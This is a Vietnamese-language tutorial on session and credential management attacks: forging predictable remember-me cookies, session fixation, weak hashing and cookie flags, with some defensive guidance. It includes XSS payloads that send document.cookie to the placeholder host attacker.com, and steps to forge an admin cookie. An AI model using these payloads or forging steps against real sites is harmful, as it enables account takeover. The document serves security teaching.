# Session & Credential Management

## Overview

Ngoài login form chính, các chức năng quản lý session và credential — đặc biệt "remember me" cookie, session handling, và cách lưu trữ credential — tạo ra attack surface đáng kể. Developer thường tập trung bảo mật login page nhưng bỏ qua các cơ chế phụ trợ này.

**Bản chất kỹ thuật**: Mỗi cơ chế "duy trì trạng thái đăng nhập" đều tương đương việc tạo **một authentication credential mới** — nếu credential này yếu, nó trở thành backdoor vào account.

## "Remember Me" / "Keep Me Logged In"

### Cách hoạt động

```
1. User login + check "Remember me"
2. Server tạo persistent cookie (remember-me token)
3. Cookie được lưu trong browser, tồn tại sau khi đóng tab/browser
4. Lần truy cập sau: browser gửi cookie → server verify → auto-login
   → Bypass hoàn toàn login form
```

### Vấn đề cốt lõi

Cookie "remember me" **thay thế hoàn toàn** quá trình authentication. Nếu attacker có cookie này, họ login mà **không cần username hay password**.

### Predictable Cookie Values

| Cookie Pattern | Ví dụ | Khả năng đoán | Attack |
|----------------|-------|----------------|--------|
| `base64(username)` | `YWRtaW4=` | Trivial | Decode → encode username khác |
| `username + timestamp` | `admin:1709078400` | Dễ | Đoán timestamp |
| `md5(username)` | `21232f297a57...` | Dễ | Lookup table |
| `base64(username:md5(password))` | `YWRtaW46NWY0Z...` | Medium | Brute-force password hash |
| `encrypt(username, key)` | Opaque blob | Khó nếu key bí mật | Cần biết encryption key |

### Phân tích cookie từ account attacker tạo

```
1. Tạo account: testuser / testpass123
2. Login + enable "Remember me"  
3. Cookie nhận được: dGVzdHVzZXI6MTYyMjUwNTYwMA==

4. Decode Base64:
   $ echo "dGVzdHVzZXI6MTYyMjUwNTYwMA==" | base64 -d
   testuser:1622505600

5. Pattern phát hiện: username:unix_timestamp
   → Tạo cookie cho admin: base64("admin:current_timestamp")
```

### Password trong Cookie

Trường hợp nghiêm trọng hơn — cookie chứa **password hash**:

```
Cookie: remember=YWRtaW46NWY0ZGNjM2I1YWE3NjVkNjFkODMyN2RlYjg4MmNmOTk=

Decode: admin:5f4dcc3b5aa765d61d8327deb882cf99

Nhận diện: 5f4dcc3b... = md5("password")
→ Password của admin là "password"
```

**Tại sao nguy hiểm**:
- Unsalted hash → rainbow table / online lookup
- MD5 → crackable trong giây
- Ngay cả SHA256 unsalted cũng vulnerable với wordlist attack

### Lưu ý quan trọng về Encryption

| Phương thức | An toàn? | Lý do |
|-------------|----------|-------|
| Base64 encoding | ✗ | Không phải encryption, reversible |
| MD5/SHA without salt | ✗ | Rainbow table attack |
| MD5/SHA with salt | Tốt hơn | Nhưng nếu salt lộ → vẫn crackable |
| AES encryption | ✓ (nếu key bí mật) | Cần quản lý key đúng cách |
| HMAC with secret | ✓ | Server-side secret giữ integrity |

## Cookie Theft

### XSS → Cookie Theft

Nếu ứng dụng có XSS vulnerability:

```javascript
// Attacker inject script
<script>
  new Image().src = "https://attacker.com/steal?c=" + document.cookie;
</script>

// Hoặc fetch-based
<script>
  fetch("https://attacker.com/steal", {
    method: "POST",
    body: document.cookie
  });
</script>
```

Attacker nhận được remember-me cookie → set cookie trong browser của mình → login as victim.

### Open Source Framework Exposure

Nếu app dùng open-source framework, cookie structure có thể **publicly documented**:

| Framework | Cookie Format | Documentation |
|-----------|--------------|---------------|
| Spring Security | `base64(username:expiryTime:md5(password:expiryTime:key))` | Public |
| WordPress | `wordpress_logged_in_[hash]` | Public |
| Laravel | Encrypted with APP_KEY | Key leaks = full compromise |

## Session Management Flaws

### Session Fixation

```
1. Attacker truy cập app → nhận session ID: ABC123
2. Attacker gửi link cho victim: https://app.com/?sessionid=ABC123
3. Victim click → browser set session ABC123
4. Victim login → session ABC123 giờ associated với victim account
5. Attacker dùng session ABC123 → logged in as victim
```

### Session Not Invalidated After Auth Events

| Event | Should invalidate sessions? | Tại sao |
|-------|---------------------------|---------|
| Password change | ✓ | Old password may be compromised |
| Password reset | ✓ | Account recovery scenario |
| Enable 2FA | ✓ | Existing sessions bypass 2FA |
| Disable 2FA | ✓ | Security setting changed |
| Role/privilege change | ✓ | Authorization scope changed |

### Concurrent Session Control

```
Không giới hạn concurrent sessions:
  Attacker session ────► Active ← không bao giờ bị kick
  Victim session   ────► Active
  
→ Attacker duy trì access vô thời hạn
  Ngay cả khi victim đổi password (nếu session không bị invalidate)
```

## Credential Storage Analysis

### Server-side

| Method | Security | Notes |
|--------|----------|-------|
| **Plaintext** | ✗ Critical | Breach = full exposure |
| **MD5** | ✗ | Cracked trong giây |
| **SHA-256** | ✗ (unsalted) | Rainbow table attack |
| **SHA-256 + salt** | Medium | Better but fast to brute-force |
| **bcrypt** | ✓ | Slow hash, resistant to brute-force |
| **Argon2** | ✓✓ | Memory-hard, modern standard |

### Client-side (Browser)

| Storage | Accessible by JS? | Security |
|---------|-------------------|----------|
| Cookie (no HttpOnly) | ✓ | XSS vulnerable |
| Cookie (HttpOnly) | ✗ | Better — XSS can't read |
| Cookie (Secure) | N/A — HTTPS only | Prevents MITM |
| localStorage | ✓ | XSS vulnerable, no expiry |
| sessionStorage | ✓ | XSS vulnerable, tab-scoped |

## Cookie Security Flags

| Flag | Mục đích | Thiếu flag → Rủi ro |
|------|----------|---------------------|
| `HttpOnly` | Prevent JS access | XSS → cookie theft |
| `Secure` | HTTPS only | MITM → cookie intercept |
| `SameSite=Strict` | Prevent CSRF | Cross-site request with cookie |
| `Path=/` | Scope to path | Cookie exposure to other paths |
| `Domain` | Scope to domain | Subdomain cookie sharing |
| `Expires/Max-Age` | Token lifetime | Persistent access if too long |

## Attack Decision Tree

```
┌─────────────────────────────┐
│ Có "Remember Me" feature?   │
└──────────┬──────────────────┘
           │ Yes
┌──────────▼──────────────────┐
│ Cookie structure phân tích  │
│ được? (Base64, hash, etc.)  │
└──────────┬──────────────────┘
      ┌────┼────┐
     Yes   │    No
      │    │    │
      ▼    │    ▼
  Generate │  Tìm XSS
  cookie   │  để steal cookie
  cho user │
  khác     │
           ▼
     Brute-force
     password hash
     trong cookie
```

## Related Files

- [2FA Bypass Techniques](04-2fa-bypass-techniques.md)
- [Password Reset Vulnerabilities](05-password-reset-vulnerabilities.md)
- [Authentication Logic Flaws](07-authentication-logic-flaws.md)
- [Defense & Mitigation](08-defense-mitigation.md)
